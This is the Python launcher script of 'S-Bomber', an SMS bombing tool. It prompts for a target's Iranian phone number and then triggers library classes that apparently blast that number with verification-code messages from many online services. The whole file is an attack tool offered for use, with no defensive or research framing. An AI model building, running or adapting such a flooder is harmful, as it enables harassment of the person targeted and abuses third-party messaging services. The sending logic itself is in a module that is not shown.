# Github: https://github.com/ibehii
# Telegram: https://T.me/BZHNAM
# e-mail: Behii@tutanota.com
# ____________________________________________

# ======== # Import part # ======== #  
from os import name
from os import path as os_path
from sys import path as sys_path
from shutil import move
from lib import IranianSMS
from colorama import Fore
from subprocess import run
try:
    import pyfiglet
    from requests import get, Response, exceptions
    from Rcolor import standard_fg 
    from colorama import Fore
    from selenium.common.exceptions import WebDriverException
except ImportError:
    print('Some required module are missing.\nPlease run "path pip install -r requirements.txt" command on your terminal.')


# ======== # Download required font for figlet # ======== #
pyfiglet_path: str = pyfiglet.__file__.replace('__init__.py', 'fonts')

if (not os_path.exists(os_path.join(pyfiglet_path + 'ANSI Shadow.flf'))):
    try:
        move(os_path.join(sys_path[0], 'ANSI Shadow.flf'), os_path.join(pyfiglet_path, 'ANSI Shadow.flf'))
    except FileNotFoundError:
        print(Fore.RED + os_path.join(sys_path[0], 'ANSI Shadow.flf') + ' Was Not Found!\n' + Fore.RESET)
        print(Fore.YELLOW + 'Downloading the required font!' + Fore.RESET)
        try:
            fontFile: Response = get("https://github.com/xero/figlet-fonts/raw/master/ANSI%20Shadow.flf", allow_redirects=True)
            open(os_path.join(pyfiglet_path + 'ANSI Shadow.flf'), 'wb').write(fontFile.content)
        except (exceptions.Timeout, exceptions.ReadTimeout):
            exit(Fore.RED + "Couldn't connect to server.\nCheck your internet connection and try again" + Fore.RESET)

# ======== # clear screen # ======== #
_clear_screen = lambda: run('cls') if name == 'nt' else run('clear')
_clear_screen()

# ======== # startup Menu # ======== #
print(standard_fg(pyfiglet.figlet_format('S-Bomber' ,font='ANSI Shadow')),
Fore.MAGENTA + '- My telegram : t.me/BZHNAM -\n' + '- My github : https://github.com/ibehii -\n\n' + Fore.YELLOW + '------------ # v1.0.0 # ------------  \n' + Fore.RESET)
target_Phone_Number: str = input(Fore.GREEN + '- Enter your target phone number (e.g: 989126543210)-> ' + Fore.RESET)

if(not target_Phone_Number.isnumeric()):
    exit(Fore.RED + 'Please enter target phone number like human :/' + Fore.RESET)
elif(not target_Phone_Number.startswith('98')):
    exit(Fore.RED + 'Unfortunately, at this version we only accept Iranian number.\n Fallow my github page for newest version!' + Fore.RESET)
elif(len(target_Phone_Number) != 12):
    exit(Fore.RED + 'Are you sure that phone number is correct? Phone numbers has 12 digits.' + Fore.RESET)
else:
    print(Fore.RED + 'Note: For best result check README.md file')
    print(Fore.BLUE + 'STARTING THE OPERATION ...' + Fore.RESET)
    target_Phone_Number = '0' + target_Phone_Number.split('98')[1]

# ========= # start to send code # ========= #
iranianSender = IranianSMS(target_Phone_Number)
iranianSender.AllAtOnce()
try:
    from lib import IranianWebSMS
    web_irainan_sender = IranianWebSMS(target_Phone_Number)
    web_irainan_sender.AllAtOnce()
except ImportError:
    print(Fore.RED + 'A file ("WebDepend_Bomb.py") is missing. Couldn\'t send 11 message. Check github.com/ibehii/S-Bomber')
    pass
except WebDriverException:
    print(Fore.RED + 'FireFox is not installed or webdriver is missing. Couldn\'t send 11 message. Check github.com/ibehii/S-Bomber')